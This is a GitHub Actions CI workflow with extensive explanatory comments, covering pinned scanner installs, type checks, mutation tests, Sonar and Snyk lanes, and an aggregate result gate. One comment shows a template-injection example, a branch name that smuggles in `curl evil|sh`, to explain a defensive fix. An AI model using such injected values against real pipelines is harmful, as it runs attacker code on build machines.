name: check

on:
  push:
    branches: [main, v1]
  pull_request:
  # The combination, not the branch. Two pull requests that each pass alone can fail
  # together — one renames what the other calls — and a repository whose only gate is the
  # pull request merges both and learns on main. Every job below runs under this event as
  # well, because none of them is conditioned on the event name, and `CI Result` counts a
  # skipped job as a failure precisely so that a lane cannot go quiet here.
  merge_group:

permissions:
  contents: read

concurrency:
  group: check-${{ github.ref }}
  cancel-in-progress: true

env:
  # `just` comes from PyPI and not from an action. This repository allows GitHub-owned
  # actions and nine explicit patterns, and `extractions/*` is not one of them: a workflow
  # naming an action outside that list never starts, so every job here — CI Result included,
  # which branch protection requires — reported startup_failure with no logs to read.
  JUST_VERSION: "1.58.0"
  GITLEAKS_VERSION: "8.30.1"
  TRIVY_VERSION: "0.73.0"
  ACTIONLINT_VERSION: "1.7.12"
  # The linux_amd64 line from the official actionlint_1.7.12_checksums.txt. The version
  # says which release we asked for; the checksum says the bytes we got are that release.
  ACTIONLINT_SHA256: "8aca8db96f1b94770f1b0d72b6dddcb1ebb8123cb3712530b08cc387b349a3d8"
  # The other two, from the same publishers' own checksum files, read on 2026-08-16 with the
  # owner's consent for that one network call. Until this, actionlint was the only download
  # whose bytes were checked: the version said which release we asked for and nothing said
  # the bytes we got were that release, on the two engines whose whole job is to find things.
  GITLEAKS_SHA256: "551f6fc83ea457d62a0d98237cbad105af8d557003051f41f3e7ca7b3f2470eb"
  # The same release, read from the same place, for the two machines the `platforms` lane
  # runs on. Twelve of its sixteen first-run failures were this binary being absent: the
  # installer warns and returns WARN, and the acceptance path refuses with
  # ACCEPTANCE_GITLEAKS_UNAVAILABLE. Pinned rather than taken from a package manager,
  # because `just security` refuses a scanner whose version it did not pin and this lane
  # has no business being the exception.
  GITLEAKS_SHA256_DARWIN: "b40ab0ae55c505963e365f271a8d3846efbc170aa17f2607f13df610a9aeb6a5"
  GITLEAKS_SHA256_WINDOWS: "d29144deff3a68aa93ced33dddf84b7fdc26070add4aa0f4513094c8332afc4e"
  TRIVY_SHA256: "2edd39da482bb4e9831962487b68f68e3928ec3137794757f54d00383d79547b"
  PIP_AUDIT_VERSION: "2.10.1"
  MYPY_VERSION: "2.3.0"
  SNYK_VERSION: "1.1306.3"

jobs:
  check:
    runs-on: ubuntu-latest
    timeout-minutes: 20
    steps:
      - uses: step-security/harden-runner@bf7454d06d71f1098171f2acdf0cd4708d7b5920 # v2.20.0
        with:
          egress-policy: audit
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          fetch-depth: 0
          persist-credentials: false
      - uses: astral-sh/setup-uv@cec208311dfd045dd5311c1add060b2062131d57 # v8.0.0

      # Downloaded and extracted, never piped into a shell: our own semgrep rules would
      # flag that, and a gate that breaks its own rules teaches people to ignore it.
      - name: install just and the scanners
        run: |
          curl -sSfL -o gitleaks.tgz "https://github.com/gitleaks/gitleaks/releases/download/v${GITLEAKS_VERSION}/gitleaks_${GITLEAKS_VERSION}_linux_x64.tar.gz"
          echo "${GITLEAKS_SHA256}  gitleaks.tgz" | sha256sum -c -
          tar -xzf gitleaks.tgz gitleaks && sudo install gitleaks /usr/local/bin/
          curl -sSfL -o trivy.tgz "https://github.com/aquasecurity/trivy/releases/download/v${TRIVY_VERSION}/trivy_${TRIVY_VERSION}_Linux-64bit.tar.gz"
          echo "${TRIVY_SHA256}  trivy.tgz" | sha256sum -c -
          tar -xzf trivy.tgz trivy && sudo install trivy /usr/local/bin/
          curl -sSfL -o actionlint.tgz "https://github.com/rhysd/actionlint/releases/download/v${ACTIONLINT_VERSION}/actionlint_${ACTIONLINT_VERSION}_linux_amd64.tar.gz"
          echo "${ACTIONLINT_SHA256}  actionlint.tgz" | sha256sum -c -
          tar -xzf actionlint.tgz actionlint && sudo install actionlint /usr/local/bin/
          uv tool install semgrep==1.172.0
          uv tool install zizmor==1.17.0
          uv tool install "rust-just==${JUST_VERSION}"

      # Two readers, because they disagree on purpose. actionlint knows what GitHub will
      # accept; zizmor knows what an attacker will do with what GitHub accepts.
      #
      # Before the gate, not after it, and that ordering is the whole point. These two read
      # files and need nothing built, so putting them last bought nothing and cost this:
      # every run where `just check` failed skipped them, so on a branch that had never been
      # green they had never executed at all. Their first run found two real findings in a
      # workflow written weeks earlier. A check that only runs once everything else passes
      # reports on the days it was least needed.
      - name: workflows are a language too, and the most attacked one
        run: |
          actionlint
          uv tool run zizmor .github/workflows/

      # `shell: bash` is what makes the pipe carry a verdict. The implicit shell for `run:`
      # on Linux is `bash -e {0}` and never `-o pipefail`, which arrives only when the key
      # is written out — so `just check | tee` exited on tee's status and the gate could not
      # fail. Proven rather than argued: `false | tee /dev/null` exits 0 under `bash -e` and
      # 1 under `bash -eo pipefail`. The step below caught the case where a `RAN` line went
      # missing and no other: `check` prints all five before its last three recipes run, so a
      # failure in `intent-page`, `lenses` or `ran` left a complete log and a green job.
      - name: the gate, exactly as a developer runs it
        shell: bash
        run: just check | tee "$RUNNER_TEMP/check.log"

      - name: it has to prove it ran
        run: uv run python tests/anti_theatre.py "$RUNNER_TEMP/check.log" .

      # `just cover` leaves a combined .coverage behind. Sonar reads Cobertura, so the
      # conversion lives here rather than in the justfile: a developer running the gate
      # locally has no SonarCloud to feed and should not pay for the XML.
      - name: coverage in the shape Sonar reads
        run: uv run --with coverage==7.15.4 coverage xml -o coverage.xml

      - uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7
        with:
          name: coverage-xml
          path: coverage.xml
          if-no-files-found: error

      # The day that stopped being true was 2026-08-09: spec 006 declared rich and
      # questionary, and five more arrived behind them. So this step now has something to
      # find, and the export is checked before the audit reads it — `pip-audit --strict`
      # over an empty requirements file exits 0 and reports a green nobody earned, which
      # is the one way this lane can be running and covering nothing.
      - name: dependencies, audited against the advisory databases
        run: |
          uv export --no-hashes --no-emit-project --format requirements-txt -o requirements.txt
          uv run --no-project python - <<'PY'
          import re, sys, tomllib
          declared = [re.split(r"[<>=!~ \[]", d)[0].lower()
                      for d in tomllib.load(open("pyproject.toml", "rb"))["project"]["dependencies"]]
          exported = open("requirements.txt").read().lower()
          missing = [d for d in declared if not re.search(rf"^{re.escape(d)}==", exported, re.M)]
          sys.exit(f"the audit would have read nothing about: {', '.join(missing)}" if missing else 0)
          PY
          uv run --no-project --with "pip-audit==${PIP_AUDIT_VERSION}" pip-audit --strict -r requirements.txt

      # `ai-eng doctor --ci` cannot exit 0, on any commit, and it is not supposed to. `--ci`
      # counts every check a runner cannot answer as unanswered, unanswered is INCOMPLETE,
      # and "not evaluated is never green" is the rule this whole product is about. So the
      # step as written — the command alone, its exit code taken as the verdict — was a step
      # that could never pass. It went unnoticed because every earlier failure in this job
      # ran out of road before reaching it.
      #
      # What a runner can gate on is the other half of the same report: nothing FAILED here.
      # The readable report goes into the log for a person, and the JSON one is what decides.
      - name: is the system healthy
        run: |
          uv tool install --editable .
          ai-eng doctor --ci || true
          ai-eng --json doctor --ci > "$RUNNER_TEMP/doctor.json" || true
          uv run --no-project python - "$RUNNER_TEMP/doctor.json" <<'PY'
          import json, sys

          report = json.load(open(sys.argv[1], encoding="utf-8"))
          remaining = report.get("remaining", [])
          decided = [line for line in remaining if not line.endswith("could not be evaluated")]
          print(f"{report['outcome']}: {len(decided)} decided faults, "
                f"{len(remaining) - len(decided)} unanswerable on a runner")
          for line in decided:
              print(f"  {line}")
          sys.exit(1 if decided else 0)
          PY

      # The seal first, and this is what makes the line under it a check rather than a
      # formality. Events live in an in-flight buffer until a session ends; on a runner no
      # session ever ends, so the chain was never created and `audit verify` answered
      # CHAIN_MISSING — INCOMPLETE, exit 1, on every commit. Both halves were wrong: the
      # step could not pass, and had it passed it would have verified nothing.
      #
      # `SessionEnd` through the real dispatcher, exactly as a surface fires it, seals what
      # this job actually recorded. Then `verify` reads a chain with this run's own links in
      # it, which is the only version of that question worth asking.
      - name: the record is intact
        run: |
          echo '{"hook_event_name":"SessionEnd"}' | python3 hooks/chain.py SessionEnd
          ai-eng audit verify

      # The claim, checked where the diff is. A branch that holds no claim is not a branch
      # that passed: it says "not applicable" and says it out loud, because a quiet pass and
      # a real one look identical in a log six weeks later. The claim is read from the
      # remote rather than from the branch, which is the one copy both sides can see.
      - name: the branch stayed inside the claim it took
        env:
          ITEM: ${{ github.head_ref || github.ref_name }}
          # A branch name is attacker-supplied text, and an expression inside a run block is
          # pasted into the script before bash ever sees it — so a branch called
          # `x";curl evil|sh;"` would run. Through the environment it stays one string that
          # bash quotes. zizmor calls this template-injection and rates it high; it was
          # right, and it had never run here to say so.
          BASE_REF: ${{ github.base_ref || 'main' }}
        run: |
          if [ -z "$(git ls-remote origin "refs/ai-eng/claims/$ITEM")" ]; then
            echo "no claim is held for $ITEM: not applicable"
            exit 0
          fi
          git fetch --no-tags origin "+refs/heads/${BASE_REF}:refs/gate/base"
          ai-eng spec checkpoint --base refs/gate/base --item "$ITEM"

  suite:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - uses: step-security/harden-runner@bf7454d06d71f1098171f2acdf0cd4708d7b5920 # v2.20.0
        with:
          egress-policy: audit
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          persist-credentials: false
      - uses: astral-sh/setup-uv@cec208311dfd045dd5311c1add060b2062131d57 # v8.0.0
      - name: install gitleaks
        run: |
          curl -sSfL -o gitleaks.tgz "https://github.com/gitleaks/gitleaks/releases/download/v${GITLEAKS_VERSION}/gitleaks_${GITLEAKS_VERSION}_linux_x64.tar.gz"
          echo "${GITLEAKS_SHA256}  gitleaks.tgz" | sha256sum -c -
          tar -xzf gitleaks.tgz gitleaks && sudo install gitleaks /usr/local/bin/
      - name: every attack, and a clean control it must not fire on
        run: uv run python tests/adversarial/run.py

  # Break the guards on purpose, and fail if nothing notices. Its own job because it edits
  # the checkout while it runs and because it is the only lane here measured in minutes
  # rather than seconds — 6 min 07 s for all sixteen rows on the machine that wrote this,
  # 16 of 16 killed. It was in no job at all until now: `tests/mutation.py` carried the
  # sentence "run it when a guard's deny path changes, and before a release", nothing
  # executed that sentence, and nothing could tell a run from an absence.
  #
  # In `ci-result`'s needs, so it blocks without touching branch protection. The floor is
  # 100 and a single survivor fails: sixteen defects a person chose, in the four guards that
  # decide whether an action is allowed and the four verbs that write the record.
  guards:
    runs-on: ubuntu-latest
    # Twice the measured local run and change. If this starts timing out the honest reading
    # is that the lane grew or the suite did, and the number to raise is here.
    timeout-minutes: 25
    steps:
      - uses: step-security/harden-runner@bf7454d06d71f1098171f2acdf0cd4708d7b5920 # v2.20.0
        with:
          egress-policy: audit
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          persist-credentials: false
          # The suite is one of the three halves a mutant has to survive, and `madr.validate`
          # walks committed history. On a one-commit checkout it returns INCOMPLETE, so the
          # baseline is red and `tests/mutation.py` refuses to score at all — correctly, over
          # a cause that has nothing to do with any mutant. `check` already sets this.
          fetch-depth: 0
      - uses: astral-sh/setup-uv@cec208311dfd045dd5311c1add060b2062131d57 # v8.0.0
      # From PyPI and not from an action, the same way every other job here gets it: this
      # repository allows GitHub-owned actions and a named list, and a job naming an action
      # outside that list never starts — it reports startup_failure with no logs.
      - name: install just
        run: uv tool install "rust-just==${JUST_VERSION}"
      # And the scanner, because one of the sixteen rows fires a guard through the
      # adversarial suite and that suite reports NOT RUN for the staged-secret attack
      # without it. `tests/mutation.py` refuses to score over a tree that is already red —
      # a score taken over a red baseline is a full score nobody earned — so the absence
      # stopped the whole lane rather than quietly costing it one row.
      - name: install gitleaks
        run: |
          curl -sSfL -o gitleaks.tgz "https://github.com/gitleaks/gitleaks/releases/download/v${GITLEAKS_VERSION}/gitleaks_${GITLEAKS_VERSION}_linux_x64.tar.gz"
          echo "${GITLEAKS_SHA256}  gitleaks.tgz" | sha256sum -c -
          tar -xzf gitleaks.tgz gitleaks && sudo install gitleaks /usr/local/bin/
      # `shell: bash` for the pipe, for the same reason the gate above needs it: without it
      # this step would report tee's zero and a surviving mutant would merge.
      - name: break the guards on purpose
        shell: bash
        run: just guards | tee "$RUNNER_TEMP/guards.log"
      # And the receipt, because the step above proves the mutants died and cannot prove it
      # ran over any. `RAN guards=<n>` is refused at zero by the same reader `just check`
      # uses, so a filter that stops matching — a rename, a typo — is a red and not a pass.
      - name: it has to prove it ran over something
        run: uv run python tests/anti_theatre.py "$RUNNER_TEMP/guards.log" . guards

  # Its own job, not a step inside check: it costs about ten minutes, and a gate people
  # stop running because it is slow is a gate that is not running. It still runs on every
  # push, which is the point — a test that stopped being able to fail is invisible to
  # every other job here.
  typecheck:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - uses: step-security/harden-runner@bf7454d06d71f1098171f2acdf0cd4708d7b5920 # v2.20.0
        with:
          egress-policy: audit
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          persist-credentials: false
      - uses: astral-sh/setup-uv@cec208311dfd045dd5311c1add060b2062131d57 # v8.0.0
      # The two runtime dependencies are named here because `--no-project` is deliberate —
      # the guards are checked at 3.11, which is their floor, not at whatever the project
      # resolves to. Without them mypy cannot import `rich` or `questionary` and reports
      # five import-not-found errors in ui.py: a type check that never saw the types.
      - name: types, on the product and on the guards
        run: |
          uv run --no-project --python 3.11 --with "mypy==${MYPY_VERSION}" \
            --with "rich>=13.0,<16.0" --with "questionary>=2.0,<3.0" mypy src hooks

      # The OpenCode adapter, which mypy cannot see and which is shipped to users as text.
      # No setup-node: the runner image has node and npm already, and every action added
      # here has to clear an allowlist before the workflow will start at all.
      - name: types, on the surface Python cannot read
        run: |
          npm install --silent --no-audit --no-fund
          npm exec -- tsc --noEmit

  sonar:
    name: SonarCloud
    needs: [check]
    runs-on: ubuntu-latest
    timeout-minutes: 15
    steps:
      - uses: step-security/harden-runner@bf7454d06d71f1098171f2acdf0cd4708d7b5920 # v2.20.0
        with:
          egress-policy: audit
      # Full history: Sonar decides what "new code" is from the merge base, and a shallow
      # clone quietly makes every line new, which makes the new-code gate meaningless.
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          fetch-depth: 0
          persist-credentials: false
      - uses: astral-sh/setup-uv@cec208311dfd045dd5311c1add060b2062131d57 # v8.0.0
      - uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8
        with:
          name: coverage-xml
      - name: the coverage file must exist, or Sonar reports zero and calls it a pass
        run: test -s coverage.xml
      - uses: SonarSource/sonarqube-scan-action@22918119ff8e1ca75a623e15c8296b6ea4fbe28f # v8.2.1
        env:
          SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }}

      # The scan waits for the gate; this reads what the gate contains. Its conditions live
      # in a web console, so a project admin can drop new-code coverage to zero and every
      # scan stays green with no diff here recording it. policy/quality-gate.toml declares
      # what we require and this fails when the live gate is weaker, naming the metric.
      - name: the gate is what we said it was
        env:
          SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }}
        run: uv run python tests/quality_gate.py

  # A real vulnerability must fail the build, and a throttled or unauthenticated Snyk must
  # not report a finding it never looked for. So quota, rate-limit and auth failures stop
  # this job claiming evidence and everything else fails here. They do not buy a green:
  # the aggregate below reads `evidence` and blocks, because a lane that observed nothing
  # is INCOMPLETE and INCOMPLETE is not a pass — including on a fork, where the cure is to
  # re-home the branch rather than to lower the bar. Only the SAST half runs, and the reason changed on 2026-08-09 rather than going
  # away: it used to be that `snyk test` would scan an empty requirements file, and now
  # there are seven packages to scan. They already have two readers — pip-audit against the
  # advisory databases in the `check` job, and trivy over `uv.lock` in `just security` — so
  # `snyk test` would be a third opinion on the same seven, paid for out of a quota this
  # job already has to degrade gracefully around. The SAST half has no second reader but
  # semgrep, and that is where the quota goes.
  snyk:
    name: Snyk Security
    # What this job observed, not merely whether it exited zero. A job that skipped its
    # scan and reported success is missing evidence wearing a green tick, and the aggregate
    # below cannot tell the two apart from a job result alone.
    outputs:
      evidence: ${{ steps.scan.outputs.evidence || 'unavailable' }}
    runs-on: ubuntu-latest
    timeout-minutes: 15
    steps:
      - uses: step-security/harden-runner@bf7454d06d71f1098171f2acdf0cd4708d7b5920 # v2.20.0
        with:
          egress-policy: audit
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          persist-credentials: false
      - name: is there a token
        id: token
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
        run: |
          if [ -n "$SNYK_TOKEN" ]; then
            echo "present=true" >> "$GITHUB_OUTPUT"
          else
            echo "present=false" >> "$GITHUB_OUTPUT"
            echo "::warning title=Snyk skipped::no SNYK_TOKEN on this run (a fork pull request, most likely). semgrep still covers SAST."
          fi
      - name: install the Snyk CLI
        if: steps.token.outputs.present == 'true'
        run: npm install -g "snyk@${SNYK_VERSION}" --ignore-scripts
      - name: Snyk code test
        id: scan
        if: steps.token.outputs.present == 'true'
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
        run: |
          set +e
          out=$(snyk code test --severity-threshold=high 2>&1)
          rc=$?
          printf '%s\n' "$out"
          if [ "$rc" -ne 0 ] && printf '%s' "$out" | grep -qiE 'test limit|increase your tests|rate.?limit|429|too many requests|authentication (error|failed)|not authori|quota'; then
            echo "evidence=unavailable" >> "$GITHUB_OUTPUT"
            echo "::warning title=Snyk non-blocking::Snyk was unavailable (quota or auth), not silent. semgrep and the adversarial suite still ran."
            exit 0
          fi
          echo "evidence=ran" >> "$GITHUB_OUTPUT"
          exit "$rc"

  # The context branch protection requires. Without it, a job that stops running — renamed,
  # skipped by a dependency that failed, deleted in a refactor — is invisible: the pull
  # request is still green because nothing was watching for its absence. Skipped is a
  # failure here for exactly that reason.
  # The one thing this repository ships is a wheel that writes files into somebody else's
  # machine, and every gate above ran on exactly one kind of machine. `install-matrix.yml`
  # already covers three, but it runs on a release and it tests the *installed wheel*, so a
  # test that only passes on Linux could sit in `main` for a whole cycle before anything
  # said so. This runs the suite itself, where it is written, on the other two.
  #
  # macOS and Windows only: the Linux arm is `check` and `suite` above, and paying for a
  # third Linux run buys a duplicate.
  #
  # Windows ran, once, and is not in the matrix. That is a measurement and not a waiver, so
  # here is the number: **183 failed, 2,031 passed, 19 skipped**. What makes taking the arm
  # out defensible rather than convenient is that `install-smoke` and `smoke (windows-latest)`
  # both pass — the wheel installs and the ten verbs answer on Windows. What does not survive
  # is the *suite*, which carries POSIX assumptions: 36 failures in `test_cli_migration`, 32
  # in `test_install`, 14 each in `test_hooks` and `test_update`. Eleven are Windows file
  # locking, six are the product deliberately refusing to publish a pin on that platform with
  # the test asserting the POSIX path anyway, and two are digests moving because git checked
  # the file out with CRLF.
  #
  # A permanently red lane blocks every pull request and teaches everybody to ignore it,
  # which is the failure this repository exists to catch. So the arm comes out until somebody
  # decides what to do with 183 tests, and the number lives here rather than in a commit
  # message nobody will find again.
  #
  # The Python is pinned for the same reason the arm is out. Without it `uv` took 3.14.6 on
  # macOS while every other lane runs the runner's own 3.12.3, so this lane was moving two
  # variables and reporting one. Python 3.14 changed how argparse wraps a usage line and
  # `test_the_issue_subcommand_requires_all_five_fields_and_offers_one_flag` pins that text.
  # `pyproject.toml` says `requires-python = ">=3.11"`, so that failure is a claim this
  # package makes and does not keep — and it belongs to a lane nobody has asked for yet.
  platforms:
    name: platforms (${{ matrix.os }})
    strategy:
      fail-fast: false
      matrix:
        os: [macos-latest]
    runs-on: ${{ matrix.os }}
    # The Linux suite takes about two minutes. Windows is reliably slower at process
    # creation and this suite starts a lot of them, so the budget is generous rather than
    # tight: a flake caused by the timeout would teach everybody to ignore this lane.
    timeout-minutes: 20
    steps:
      - uses: step-security/harden-runner@bf7454d06d71f1098171f2acdf0cd4708d7b5920 # v2.20.0
        with:
          egress-policy: audit
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          persist-credentials: false
          # `madr.validate` walks committed history to prove every status transition, so on
          # the default shallow checkout it returns INCOMPLETE and four tests fail for a
          # reason that has nothing to do with the machine they run on.
          fetch-depth: 0
      - uses: astral-sh/setup-uv@cec208311dfd045dd5311c1add060b2062131d57 # v8.0.0
      - name: install the pinned gitleaks
        if: runner.os == 'macOS'
        run: |
          curl -sSfL -o gitleaks.tgz "https://github.com/gitleaks/gitleaks/releases/download/v${GITLEAKS_VERSION}/gitleaks_${GITLEAKS_VERSION}_darwin_arm64.tar.gz"
          echo "${GITLEAKS_SHA256_DARWIN}  gitleaks.tgz" | shasum -a 256 -c -
          tar -xzf gitleaks.tgz gitleaks && sudo install gitleaks /usr/local/bin/
      - name: install the pinned gitleaks
        if: runner.os == 'Windows'
        shell: pwsh
        run: |
          $url = "https://github.com/gitleaks/gitleaks/releases/download/v$env:GITLEAKS_VERSION/gitleaks_${env:GITLEAKS_VERSION}_windows_x64.zip"
          Invoke-WebRequest -Uri $url -OutFile gitleaks.zip
          $got = (Get-FileHash gitleaks.zip -Algorithm SHA256).Hash.ToLower()
          if ($got -ne $env:GITLEAKS_SHA256_WINDOWS) {
            throw "gitleaks.zip hashes to $got and this workflow pinned $env:GITLEAKS_SHA256_WINDOWS"
          }
          Expand-Archive gitleaks.zip -DestinationPath "$env:RUNNER_TEMP\gitleaks" -Force
          "$env:RUNNER_TEMP\gitleaks" | Out-File -FilePath $env:GITHUB_PATH -Encoding utf8 -Append
      # It has to be on PATH before the suite starts, and saying so here is cheaper than
      # reading twelve failures to find out it was not.
      - name: it is there
        run: gitleaks version
      # The suite and nothing else. `just check` is not portable and pretending otherwise
      # would be the theatre this repository exists to catch: it wants gitleaks, trivy, npm
      # and a shell pipeline, and a lane that silently skips half of what its name promises
      # is worse than no lane.
      # One test is deselected and it is named rather than filtered by keyword, so a rename
      # turns this red instead of silently widening it. `test_the_guards_start_fast_enough_
      # to_be_guards` measures a wall-clock start-up bound; under the whole suite in parallel
      # on a shared two-core runner that number is contention, not latency. Measured on the
      # machine that wrote this: green on its own under `-n auto`, red inside the full
      # parallel run. `just check` measures it uninstrumented on Linux, which is where the
      # number means something, and the justfile already says so above its own `test` recipe.
      # 3.14 rather than 3.12, and the version is the second thing this lane measures.
      # `pyproject.toml` declares `requires-python = ">=3.11"`, and until 2026-08-21 that was
      # a claim nothing kept: uv picked 3.14.6 here once and one test failed, because it
      # pinned how argparse wrapped a usage line and 3.14 wraps it differently. The test was
      # repaired to assert what the command accepts rather than where the line broke. Every
      # other lane runs the runner's 3.12, so between them the declared range is checked at
      # both ends by a command instead of by a sentence in a manifest.
      - name: the suite, on a machine that is not Linux and an interpreter that is not 3.12
        run: >-
          uv run --python 3.14 --with pytest==9.1.1 --with pytest-xdist==3.8.0 pytest -q -n auto tests/
          --deselect tests/test_contracts.py::test_the_guards_start_fast_enough_to_be_guards

  ci-result:
    name: CI Result
    if: always()
    needs: [check, suite, guards, typecheck, platforms, sonar, snyk]
    runs-on: ubuntu-latest
    timeout-minutes: 5
    steps:
      - uses: step-security/harden-runner@bf7454d06d71f1098171f2acdf0cd4708d7b5920 # v2.20.0
        with:
          egress-policy: audit
      # A green tick means every job ran and every job passed. It does not yet mean every
      # job observed anything: a lane whose credentials were withheld exits zero having
      # scanned nothing. So the aggregate reads the evidence a job reports as well as its
      # result, and says INCOMPLETE out loud rather than letting the absence pass as a pass.
      - name: every job ran, and every job passed
        env:
          SNYK_EVIDENCE: ${{ needs.snyk.outputs.evidence }}
          FORK: ${{ github.event.pull_request.head.repo.fork }}
          RESULTS: >-
            check=${{ needs.check.result }}
            suite=${{ needs.suite.result }}
            guards=${{ needs.guards.result }}
            typecheck=${{ needs.typecheck.result }}
            platforms=${{ needs.platforms.result }}
            sonar=${{ needs.sonar.result }}
            snyk=${{ needs.snyk.result }}
        run: |
          failed=0 ran=0
          for pair in $RESULTS; do
            printf '  %-12s %s\n' "${pair%%=*}" "${pair##*=}"
            ran=$((ran + 1))
            [ "${pair##*=}" = "success" ] || failed=1
          done
          if [ "$failed" -ne 0 ]; then
            echo "::error title=CI Result::a job did not report success. A skipped job counts as a failure: a gate nobody notices stopping is a gate that is already gone."
            exit 1
          fi
          printf '  %-12s %s\n' "snyk evidence" "${SNYK_EVIDENCE:-unavailable}"
          if [ "${SNYK_EVIDENCE:-unavailable}" != "ran" ]; then
            if [ "$FORK" = "true" ]; then
              echo "::error title=CI Result INCOMPLETE::SAST evidence is missing. GitHub withholds secrets from a fork pull request and no code on this branch can change that, so this run cannot say whether the SAST lane found anything. INCOMPLETE blocks; re-home the branch to this repository to get the evidence."
            else
              echo "::error title=CI Result INCOMPLETE::SAST evidence is missing on a run that should have had it."
            fi
            exit 1
          fi
          echo "$ran jobs, $ran successes, and every lane observed something"
